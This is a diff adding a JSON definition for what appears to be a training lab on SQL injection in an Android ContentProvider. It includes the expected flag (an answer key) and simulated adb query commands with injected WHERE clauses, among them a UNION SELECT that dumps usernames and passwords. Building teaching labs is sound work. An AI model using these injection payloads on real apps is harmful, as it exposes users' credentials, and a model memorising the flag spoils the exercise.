@@ -1,0 +1,27 @@
+{
+  "id": "mobile-android-contentprovider-sql",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{pr0v1d3r_sql1_pr0j3ct10n}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Задача: SQLi в ContentProvider\n\nПодтверди инъекцию и вытащи скрытую строку.\n"
+    },
+    {
+      "path": "/home/student/task/schema.txt",
+      "text": "TABLE notes(_id, title, body)\nTABLE users(_id, username, password)\n"
+    },
+    {
+      "path": "/home/student/task/provider_query.txt",
+      "text": "$ adb shell content query --uri content://com.example.notes.provider/notes --where \"title=Hello\"\nRow: 0 _id=1, title=Hello, body=world\n\n$ adb shell content query --uri content://com.example.notes.provider/notes --where \"1=1\"\nRow: 0 _id=1, title=Hello, body=world\nRow: 1 _id=2, title=Secret, body=nto{pr0v1d3r_sql1_pr0j3ct10n}\n\n$ adb shell content query --uri content://com.example.notes.provider/notes --where \"1=0 UNION SELECT username,password,3 FROM users--\"\nRow: 0 _id=admin, title=admin, body=s3cr3t\n"
+    }
+  ]
+}
